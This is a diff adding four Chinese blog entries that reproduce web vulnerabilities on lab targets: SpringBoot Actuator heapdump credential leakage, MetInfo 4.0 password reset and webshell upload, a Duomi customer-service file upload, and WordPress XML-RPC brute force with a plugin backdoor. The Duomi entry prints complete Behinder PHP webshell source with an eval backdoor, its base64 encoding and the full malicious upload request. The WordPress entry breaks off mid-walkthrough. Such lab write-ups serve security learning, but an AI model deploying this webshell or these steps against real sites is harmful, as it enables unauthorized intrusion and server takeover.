@@ -971,4 +971,178 @@
 <p>至此你应该对反向代理，nginx，雷池waf有了一定的了解，今天我也算是彻底说明白了到底什么是反向代理和具体的原理，希望能帮到你~</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>SpringBoot - 信息泄露</title>
+    <url>/2025/01/19/SpringBoot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h1 id="SpringBoot-信息泄露"><a href="#SpringBoot-信息泄露" class="headerlink" title="SpringBoot - 信息泄露"></a>SpringBoot - 信息泄露</h1><p>Spring Boot是一个基于Spring的套件，它提供了一个即开即用的应用程序架构，可以简化<a href="https://so.csdn.net/so/search?q=Spring%E5%BA%94%E7%94%A8&spm=1001.2101.3001.7020">Spring应用</a>的创建及部署流程，帮助开发者更轻松快捷地构建出企业及应用。</p>
+<p>Spring Boot项目中Actuator模块提供了众多HTTP接口端点（Endpoint），来提供应用程序运行时的内部状态信息。可以使用http、jmx、ssh、telnet等来管理和监控应用。包括应用的审计（Auditing）、健康（health）状态信息、数据采集（metrics gathering）统计等监控运维的功能。如果没有正确使用Actuator，可能造成信息泄露等严重的安全隐患（外部人员非授权访问Actuator端点）。其中heapdump作为Actuator组件最为危险的Web端点，heapdump因未授权访问被恶意人员获取后进行分析，可进一步获取敏感信息。<br>打开网站URL后添加&#x2F;actuator</p>
+<p><img src="/2025/01/19/SpringBoot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20250119120415753.png" alt="image-20250119120415753"></p>
+<p>可以看见很多是开启状态的true</p>
+<p>访问&#x2F;actuator&#x2F;env可以看见全部的环境变量和一些配置信息</p>
+<p><img src="/2025/01/19/SpringBoot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20250119120518606.png" alt="image-20250119120518606"></p>
+<p>这题重点不在这里，我们需要找到后台然后登录才能拿到flag</p>
+<p>这里我拿dirsearch扫了一下目录</p>
+<p><img src="/2025/01/19/SpringBoot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20250119120605970.png" alt="image-20250119120605970"></p>
+<p>可以看到很多关于&#x2F;actuator的目录信息，同时也找到了登陆后台admin</p>
+<p><img src="/2025/01/19/SpringBoot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20250119121553254.png" alt="image-20250119121553254"></p>
+<p>需要用户名和密码</p>
+<p>我们需要到这里去找用户名和密码&#x2F;actuator&#x2F;heapdump</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/actuator/</span>heapdump<span class="comment">#堆转储</span></span><br></pre></td></tr></table></figure>
+
+<p>下载后的文件利用工具<strong>JDumpSpider</strong>分析里面的信息</p>
+<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JDumpSpider.jar </span>heapdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/SpringBoot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20250119122756378.png" alt="image-20250119122756378"></p>
+<p>找到用户名和密码了</p>
+<p>webadmin</p>
+<p>adminweb</p>
+<p>成功登录进来</p>
+<p><img src="/2025/01/19/SpringBoot%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20250119121910527.png" alt="image-20250119121910527"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MetInfo 4.0漏洞复现</title>
+    <url>/2025/01/19/MetInfo%204.0/</url>
+    <content><![CDATA[<h1 id="MetInfo-4-0漏洞复现"><a href="#MetInfo-4-0漏洞复现" class="headerlink" title="MetInfo 4.0漏洞复现"></a>MetInfo 4.0漏洞复现</h1><p>MetInfo米拓企业建站系统主要用于搭建企业网站，采用PHP+MySQL架构，支持SQLite数据库、达梦数据库，全站内置了SEO搜索引擎优化机制，支持用户自定义语言（全球各种语言），支持可视化编辑管理，拥有企业网站常用的功能模块（简介模块、文章模块、产品模块、下载模块、图片模块、招聘模块、在线留言、反馈系统、在线交流、友情链接、网站地图、会员与权限管理、TAG标签），强大的SEO及伪静态设置功能，支持自定义网站颜色风格，支持按栏目自定义Banner图和数据调用，支持手机底部菜单，支持用户自主二次开发，商业模板支持在线升级。系统内置标准的应用插件开发接口，拥有丰富的免费插件和收费插件，如短信接口、robots文件修改、模板制作助手、小程序（微信、百度、支付宝、字节跳动[今日头条、抖音]、360、QQ）、支付接口、商城模块、系统诊所、图片加速、网站广告插件等。无论你是技术大咖还是建站小白，都可以使用MetInfo快速搭建一个功能齐全的响应式专业网站。</p>
+<p>4.0版本存在<strong>任意用户密码重置以及文件上传的漏洞。</strong></p>
+<h2 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a>任意用户密码重置</h2><p>打开网站先访问robots.txt文件</p>
+<p>![image-20250119102009114](.&#x2F;MetInfo 4.0&#x2F;image-20250119102009114.png)</p>
+<p>管理员后台&#x2F;admin&#x2F;</p>
+<p>用户登录&#x2F;member&#x2F;</p>
+<p>先用户登录，注册一个账户并登录</p>
+<p>![image-20250119102210234](.&#x2F;MetInfo 4.0&#x2F;image-20250119102210234.png)</p>
+<p>点击修改基本信息抓包</p>
+<p>![image-20250119102359569](.&#x2F;MetInfo 4.0&#x2F;image-20250119102359569.png)</p>
+<p>把useid修改成admin</p>
+<p>安全退出这时候admin的密码就被我们修改成了刚才你修改的密码</p>
+<p>这时候访问管理员后台</p>
+<p><a href="http://node.hackhub.get-shell.com:46694/admin/login/login.php">http://node.hackhub.get-shell.com:46694/admin/login/login.php</a></p>
+<p>![image-20250119102749354](.&#x2F;MetInfo 4.0&#x2F;image-20250119102749354.png)</p>
+<p>![image-20250119102759428](.&#x2F;MetInfo 4.0&#x2F;image-20250119102759428.png)</p>
+<p>成功登录</p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>准备一个一句话木马shell.php，然后压缩为zip</p>
+<p>![image-20250119103102644](.&#x2F;MetInfo 4.0&#x2F;image-20250119103102644.png)</p>
+<p>进入网站后台，界面风格，模板管理，点击添加新模板</p>
+<p>![1737253945395](.&#x2F;MetInfo 4.0&#x2F;1737253945395.png)</p>
+<p>上传刚刚准备的shell.zip，上传后会自动将压缩包解压到&#x2F;templates&#x2F;目录下</p>
+<p>蚁剑连接获取权限</p>
+<p>![image-20250119103603836](.&#x2F;MetInfo 4.0&#x2F;image-20250119103603836.png)</p>
+<p>可以看到我写的一句话被自动解压到这里了</p>
+<p>![image-20250119103636622](.&#x2F;MetInfo 4.0&#x2F;image-20250119103636622.png)</p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>朵米客服平台漏洞复现</title>
+    <url>/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="朵米客服平台"><a href="#朵米客服平台" class="headerlink" title="朵米客服平台"></a>朵米客服平台</h1><p>存在后台任意文件上传漏洞，用户可以通过修改数据包，达到上传PHP文件的目的，并且可以自定义上传内容。</p>
+<p>先注册一个账号，点击注册使用注册个账户</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119131424060.png" alt="image-20250119131424060"></p>
+<p>进入后台点击系统设置，广告设置，有很多个图片上传点</p>
+<p>先随便上传一个图片抓包看看请求</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119132014408.png" alt="image-20250119132014408"></p>
+<p>抓包这里我们看到</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119132035724.png" alt="image-20250119132035724"></p>
+<p>上传的图片被编码成base64然后进行传输的</p>
+<p>我们先准备一个冰蝎马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;dfff0a7fa1a55c8c&quot;</span>; </span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的key就是连接密码的32位md5的前16位</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119134359631.png" alt="image-20250119134359631"></p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">dfff<span class="number">0</span>a<span class="number">7</span>fa<span class="number">1</span>a<span class="number">55</span><span class="keyword">c</span><span class="number">8</span><span class="keyword">c</span></span><br></pre></td></tr></table></figure>
+
+<p>base64编码</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZGZmZjBhN2ZhMWE1NWM4YyI7IA0KCSRfU0VTU0lPTlsnayddPSRrZXk7DQoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOw0KCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7DQogICAgJGZ1bmM9JGFyclswXTsNCiAgICAkcGFyYW1zPSRhcnJbMV07DQoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQ0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOw0KPz4NCg</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候我们再上传</p>
+<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">POST</span> /<span class="string">service</span>/<span class="string">Settingnow</span>/<span class="string">upload</span> <span class="string">HTTP</span>/<span class="string">1</span>.<span class="string">1</span></span><br><span class="line"><span class="string">Host</span>: <span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com:41686</span></span><br><span class="line"><span class="string">Content-Length</span>: <span class="string">1853542</span></span><br><span class="line"><span class="string">User-Agent</span>: <span class="string">Mozilla</span>/<span class="string">5</span>.<span class="string">0</span> (<span class="string">Windows</span> <span class="string">NT</span> <span class="string">10</span>.<span class="string">0</span>; <span class="string">Win64</span>; <span class="string">x64</span>) <span class="string">AppleWebKit</span>/<span class="string">537</span>.<span class="string">36</span> (<span class="string">KHTML</span>, <span class="string">like</span> <span class="string">Gecko</span>) <span class="string">Chrome</span>/<span class="string">120</span>.<span class="string">0</span>.<span class="string">0</span>.<span class="string">0</span> <span class="string">Safari</span>/<span class="string">537</span>.<span class="string">36</span></span><br><span class="line"><span class="string">Content-type</span>: <span class="string">application</span>/<span class="string">x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Accept</span>: */*</span><br><span class="line"><span class="string">Origin</span>: <span class="string">http</span>://<span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com:41686</span></span><br><span class="line"><span class="string">Referer</span>: <span class="string">http</span>://<span class="string">node</span>.<span class="string">hackhub</span>.<span class="built_in">get-shell.com:41686/service/settingnow/index</span></span><br><span class="line"><span class="string">Accept-Encoding</span>: <span class="string">gzip</span>, <span class="string">deflate</span></span><br><span class="line"><span class="string">Accept-Language</span>: <span class="string">zh-CN</span>,<span class="string">zh</span>;<span class="string">q</span>=<span class="string">0</span>.<span class="string">9</span></span><br><span class="line"><span class="string">Cookie</span>: <span class="string">PHPSESSID</span>=<span class="string">qe0n38i234st7t9n6o173a8as0</span>; <span class="string">JSESSIONID</span>=<span class="string">131B136C1A41F4A231559456AB0488E3</span>; <span class="string">service_token</span>=<span class="string">bc0cJPkl1nChQe8ieVAgLKTDiViTVGkpNf8tbaSN2</span>%<span class="string">252ForG0V1cw</span>%<span class="string">252F4uvQNdOgutzo</span></span><br><span class="line"><span class="string">Connection</span>: <span class="string">close</span></span><br><span class="line"></span><br><span class="line"><span class="string">img</span>=<span class="string">data:image/</span><span class="string">php</span>;<span class="string">base64</span>,<span class="string">PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZGZmZjBhN2ZhMWE1NWM4YyI7IA0KCSRfU0VTU0lPTlsnayddPSRrZXk7DQoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOw0KCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7DQogICAgJGZ1bmM9JGFyclswXTsNCiAgICAkcGFyYW1zPSRhcnJbMV07DQoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQ0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOw0KPz4NCg</span>==</span><br></pre></td></tr></table></figure>
+
+<p>把图片的格式改成php，后面跟上木马的编码形式，拦截响应</p>
+<p>上传成功</p>
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119135313762.png" alt="image-20250119135313762"></p>
+<p>webshell的位置</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">http</span>://node.hackhub.<span class="built_in">get</span>-<span class="built_in">shell</span>.com:<span class="number">41686</span>/upload/images/<span class="number">678</span>c93463b9592201.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20250119135352900.png" alt="image-20250119135352900"></p>
+<p>成功连接</p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WordPress - &quot;花咲雨町&quot;漏洞复现</title>
+    <url>/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/</url>
+    <content><![CDATA[<h1 id="WordPress-“花咲雨町”"><a href="#WordPress-“花咲雨町”" class="headerlink" title="WordPress - “花咲雨町”"></a>WordPress - “花咲雨町”</h1><p>之前打线下有个渗透就是WordPress某个主题的一个漏洞，这次来学习一下这个的</p>
+<p>我是完全对着sibei师傅的来的，靶场来自极核-getshell，很好的一个网站有很多资源</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">https</span>://<span class="built_in">get</span>-<span class="built_in">shell</span>.com/</span><br></pre></td></tr></table></figure>
+
+<p>首先是WordPress的一个程序的漏洞，先想办法获取登录信息，在WordPress上有一个REST API，以获取到当前WordPress的真实用户名</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">http://node.hackhub.<span class="built_in">get</span>-<span class="keyword">shell</span>.<span class="keyword">com</span>:<span class="number">64738</span>/<span class="keyword">wp</span>-json/<span class="keyword">wp</span>/v2/users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119204843326.png" alt="image-20250119204843326"></p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u7cf8\u5317&quot;</span><span class="punctuation">,</span><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u6253\u7834\u4e00\u5207.&quot;</span><span class="punctuation">,</span><span class="attr">&quot;link&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:\/\/192.168.74.11\/author\/2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;slug&quot;</span><span class="punctuation">:</span><span class="string">&quot;webadmin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;avatar_urls&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;24&quot;</span><span class="punctuation">:</span><span class="string">&quot;https:\/\/secure.gravatar.com\/avatar\/7932a5605eef1797bf6cbba8d576526e?s=24&amp;d=mm&amp;r=g&quot;</span><span class="punctuation">,</span><span class="attr">&quot;48&quot;</span><span class="punctuation">:</span><span class="string">&quot;https:\/\/secure.gravatar.com\/avatar\/7932a5605eef1797bf6cbba8d576526e?s=48&amp;d=mm&amp;r=g&quot;</span><span class="punctuation">,</span><span class="attr">&quot;96&quot;</span><span class="punctuation">:</span><span class="string">&quot;https:\/\/secure.gravatar.com\/avatar\/7932a5605eef1797bf6cbba8d576526e?s=96&amp;d=mm&amp;r=g&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;_links&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;self&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;href&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:\/\/192.168.74.11\/wp-json\/wp\/v2\/users\/2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;targetHints&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;allow&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;GET&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;collection&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;href&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:\/\/192.168.74.11\/wp-json\/wp\/v2\/users&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p>得到一串这个slug的值就是当前web站点的真实登录的用户名也就是webadmin</p>
+<p>有了用户名下面我们接着找爆破的地方</p>
+<p>WordPress 的 xmlrpc.php 文件是一个用于处理外部请求的接口，允许通过 XML-RPC 协议与 WordPress 网站进行通信，允许外部应用程序与 WordPress 进行交互，如发布文章、管理评论、获取统计数据、登录请求等。</p>
+<p>Tips：在默认情况下，一些主题会禁用 xmlrpc.php这个功能文件（不用这个东西的话可以直接删除这个文件以提升安全性，不影响WordPress的使用），包括本靶机默认情况下也是禁用的，但是为了流程就开起来了。不过在很多的WordPress站点上，这个功能并没有关闭，依然可以利用。</p>
+<p>我们尝试访问一下试试</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/xmlrpc.php</span><br></pre></td></tr></table></figure>
+
+<p>只允许POST请求</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119205459899.png" alt="image-20250119205459899"></p>
+<p>查询当前可以用的方法</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /xmlrpc.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: node.hackhub.get-shell.com:<span class="number">64738</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">131.0.0.0</span> Safari/<span class="number">537</span>.<span class="number">36</span> Edg/<span class="number">131.0.0.0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh,zh-CN;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=mu311op1a8stoiprqrp1td1geh; showed_system_notice=showed; fps_accelerat=<span class="number">116</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;methodCall&gt;</span></span><br><span class="line">  <span class="section">&lt;methodName&gt;</span><span class="attribute">system</span>.listMethods&lt;/methodName&gt;</span><br><span class="line">  <span class="section">&lt;params&gt;</span><span class="section">&lt;/params&gt;</span></span><br><span class="line"><span class="section">&lt;/methodCall&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到响应有很多方法可以用</p>
+<p><strong><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119210644098.png" alt="image-20250119210644098"></strong></p>
+<p>这里我们用</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">wp</span>.getUserBlogs</span><br></pre></td></tr></table></figure>
+
+<p>数据包如下</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xmlrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node.hackhub.get-shell.com:64738</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>170</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119213908151.png" alt="image-20250119213908151"></p>
+<p>可以看到响应，已知用户名是webadmin，开始爆破</p>
+<p>可以看见这里已经提示我们成功了</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214232138.png" alt="image-20250119214232138"></p>
+<p>用户名:webadmin</p>
+<p>密码:admin123</p>
+<p>成功登录</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214345279.png" alt="image-20250119214345279"></p>
+<p>下面上传后门</p>
+<p>一般来说，进入后WordPress后台只需要使用 <strong>插件 -&gt; 插件文件编辑器</strong> 或者 <strong>外观 -&gt; 主题文件编辑器</strong> ，就可以直接编辑主题 &#x2F; 插件的PHP代码，从而实现插入后门。</p>
+<p>来这里随便下个插件</p>
+<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>//cn.wordpress<span class="meta">.org</span>/plugins/</span><br></pre></td></tr></table></figure>
+
+<p>准备一个一句话木马，塞到下载的插件文件里</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214558096.png" alt="image-20250119214558096"></p>
+<p>点击后台管理，插件，安装新插件，上传插件，立即安装</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220319215.png" alt="image-20250119220319215"></p>
